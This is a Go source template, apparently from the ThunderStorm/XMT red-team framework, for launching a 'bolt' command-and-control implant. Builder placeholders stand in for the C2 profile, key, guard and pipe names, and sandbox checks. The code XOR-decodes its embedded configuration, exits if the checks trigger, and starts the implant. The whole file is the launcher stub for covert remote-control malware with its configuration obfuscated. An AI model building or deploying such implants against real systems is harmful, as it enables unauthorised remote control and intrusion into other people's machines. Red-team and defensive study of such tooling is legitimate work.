// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/data/crypto/subtle"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

var z = cfg.Config{
	$profile
}

var g = [...]byte{
	$guard
}
var p = [...]byte{
	$pipe
}
var k = [...]byte{
	$key
}

func main() {
	if $checks {
		return
	}
	subtle.XorOp(z, k[:])
	bolt.Start(
		$ignore, $load, $critical, man.LinkerFromName($event),
		util.Decode(k[:], g[:]), util.Decode(k[:], p[:]), z,
	)
}
